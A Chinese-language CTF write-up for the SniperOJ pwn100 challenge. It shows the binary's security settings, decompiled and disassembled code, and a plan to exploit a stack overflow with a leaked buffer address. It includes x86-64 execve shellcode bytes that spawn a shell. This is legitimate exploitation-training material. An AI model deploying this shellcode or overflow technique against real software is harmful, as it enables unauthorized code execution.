# sniperoj-pwn100-shellcode-x86-64    

## 安全环境：   
    Arch:     amd64-64-little   
    RELRO:    Partial RELRO   
    Stack:    No canary found   
    NX:       NX disabled   
    PIE:      PIE enabled   
    RWX:      Has RWX segments    
64位，部分relro，开启pie，有rwx权限    
    
## 源程序：        
int __cdecl main(int argc, const char **argv, const char **envp)        
{       
  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF       
        
  buf[0] = 0LL;     
  buf[1] = 0LL;     
  setvbuf(_bss_start, 0LL, 1, 0LL);     
  puts("Welcome to Sniperoj!");     
  printf("Do your kown what is it : [%p] ?\n", buf);        
  puts("Now give me your answer : ");       
  read(0, buf, 0x40uLL);        
  return 0;     
}       
        
显然，buf大小是10h，可覆盖40h     
没有system，也没有/bin/sh，也没有开启nx     
        
用https://www.exploit-db.com/shellcodes/46907找到shellcode     
shellcode=”\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05”        
        
## 反编译      
; Attributes: bp-based frame        
        
; int __cdecl main(int argc, const char **argv, const char **envp)      
public main     
main proc near      
        
buf= qword ptr -10h     
var_8= qword ptr -8     
        
push    rbp     
mov     rbp, rsp        
sub     rsp, 10h        
mov     [rbp+buf], 0        
mov     [rbp+var_8], 0      
mov     rax, cs:__bss_start     
mov     ecx, 0          ; n     
mov     edx, 1          ; modes     
mov     esi, 0          ; buf       
mov     rdi, rax        ; stream        
call    _setvbuf        
lea     rdi, s          ; "Welcome to Sniperoj!"        
call    _puts       
lea     rax, [rbp+buf]      
mov     rsi, rax        
lea     rdi, format     ; "Do your kown what is it : [%p] ?\n"      
mov     eax, 0      
call    _printf     
lea     rdi, aNowGiveMeYourA ; "Now give me your answer : "     
call    _puts       
lea     rax, [rbp+buf]      
mov     edx, 40h ; '@'  ; nbytes        
mov     rsi, rax        ; buf       
mov     edi, 0          ; fd        
call    _read       
mov     eax, 0      
leave       
retn        
main endp       
        
由于leave会影响shellcode执行，所以把shellcode放在buf首地址后10h+8的地址。        
